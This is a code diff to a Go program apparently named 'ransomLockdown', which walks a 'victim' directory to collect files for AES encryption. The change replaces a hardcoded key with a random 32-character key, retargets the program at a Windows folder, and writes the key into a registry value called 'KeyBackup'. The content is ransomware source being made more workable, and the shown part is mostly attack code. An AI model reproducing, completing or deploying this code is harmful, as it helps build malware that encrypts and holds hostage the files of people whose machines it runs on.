@@ -4,15 +4,32 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"fmt"
+	"math/rand"
 	"os"
 	"path/filepath"
+	"time"
 
+	"golang.org/x/sys/windows/registry"
 	"tawesoft.co.uk/go/dialog"
 )
 
+var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890#$%&*()=-[]{}|?/.;")
+
+func randSeq(n int) string {
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
 func main() {
-	aesKey := "adfs4856#!@$#@595689yhygf8gf23$2"
-	victimDirectory := "/home/anthony/Documents/code/go/ransomLockdown/src/"
+	rand.Seed(time.Now().UnixNano())
+
+	aesKey := randSeq(32)
+
+	victimDirectory := "C:\\ftp\\"
+	//victimDirectory := "/home/anthony/Documents/code/go/ransomLockdown/src/"
 	var files []string
 	err := filepath.Walk(victimDirectory,
 		func(path string, info os.FileInfo, err error) error {
@@ -29,7 +46,8 @@ func main() {
 		fmt.Println(err)
 	}
 	key := []byte(aesKey)
-
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
+	k.SetStringValue("KeyBackup", aesKey)
 	c, err := aes.NewCipher(key)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
